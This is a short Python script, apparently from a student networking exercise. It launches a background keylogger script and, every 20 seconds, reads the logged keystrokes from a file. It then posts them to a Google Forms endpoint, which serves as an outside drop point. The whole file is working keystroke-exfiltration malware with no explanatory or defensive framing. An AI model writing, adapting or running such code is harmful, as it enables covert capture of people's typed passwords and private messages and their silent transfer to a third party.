#!/usr/bin/env python3

import requests
import time
import os
from pynput.keyboard import Listener

startLog = time.time()

os.system("python3 /home/student/networking/streamkeylog.py &")
time.sleep(1)

def sendRequest():
    formInput = open("/home/student/networking/keyboard_input.txt")
    formSend = formInput.read()
    url = 'https://docs.google.com/forms/u/1/d/e/1FAIpQLSd7UuUF4b1gOs673WEFMUC6TVIv7l6NLwfBWDldiBPaKk4kBg/formResponse'
    formData = {'entry.839337160': f"'{formSend}'"}
    r = requests.post(url, data=formData)

def interval():
    global startLog
    if time.time() -20 > startLog:
        print("It's been 20 seconds")
        sendRequest()
        startLog = time.time()

counter = 0
while True:
    counter += 1
    print(counter)
    interval()
    time.sleep(1)
